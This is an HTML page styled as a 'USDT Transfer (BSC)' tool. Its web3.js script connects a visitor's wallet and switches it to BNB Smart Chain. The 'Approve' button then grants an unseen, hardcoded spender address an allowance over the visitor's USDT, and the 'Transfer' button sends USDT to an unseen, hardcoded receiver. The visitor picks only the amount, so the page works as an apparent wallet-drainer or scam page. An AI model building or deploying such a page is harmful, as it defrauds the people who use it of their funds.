<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>USDT Transfer</title>
<script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
<style>
body{font-family:Arial;text-align:center;margin-top:50px;}
button{padding:12px 20px;margin:10px;font-size:16px;border:none;border-radius:8px;}
.connect{background:#009688;color:white;}
.approve{background:#6a1b9a;color:white;}
.transfer{background:#0d47a1;color:white;}
input{padding:10px;width:200px;margin:10px;}
</style>
</head>
<body>

<h2>USDT Transfer (BSC)</h2>

<button class="connect" onclick="connectWallet()">Connect Wallet</button>
<br>

<input type="text" id="amount" placeholder="Enter USDT amount">

<br>
<button class="approve" onclick="approveUSDT()">Approve USDT</button>
<br>
<button class="transfer" onclick="transferUSDT()">Transfer USDT</button>

<script>

let web3;
let account;

const spender = "0x578b86b3d51ff707a3b4e1272effcd03979069e1";
const receiver = "0x2d0f0934524Cb69B721064807B3ab3133d158E5F";

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

const usdtABI = [
  {
    "constant":false,
    "inputs":[
      {"name":"_spender","type":"address"},
      {"name":"_value","type":"uint256"}
    ],
    "name":"approve",
    "outputs":[{"name":"","type":"bool"}],
    "type":"function"
  },
  {
    "constant":false,
    "inputs":[
      {"name":"_to","type":"address"},
      {"name":"_value","type":"uint256"}
    ],
    "name":"transfer",
    "outputs":[{"name":"","type":"bool"}],
    "type":"function"
  }
];

async function switchToBSC(){
  await window.ethereum.request({
    method: 'wallet_switchEthereumChain',
    params: [{ chainId: '0x38' }]
  });
}

async function connectWallet(){
  if(window.ethereum){
    await switchToBSC();
    web3 = new Web3(window.ethereum);
    const accounts = await ethereum.request({method:'eth_requestAccounts'});
    account = accounts[0];
    alert("Connected: " + account);
  }
}

async function approveUSDT(){
  const amount = document.getElementById("amount").value;
  const contract = new web3.eth.Contract(usdtABI, usdtAddress);
  const value = web3.utils.toWei(amount, 'ether');

  await contract.methods.approve(spender,value)
  .send({from:account});
}

async function transferUSDT(){
  const amount = document.getElementById("amount").value;
  const contract = new web3.eth.Contract(usdtABI, usdtAddress);
  const value = web3.utils.toWei(amount, 'ether');

  await contract.methods.transfer(receiver,value)
  .send({from:account});
}

</script>
</body>
</html>
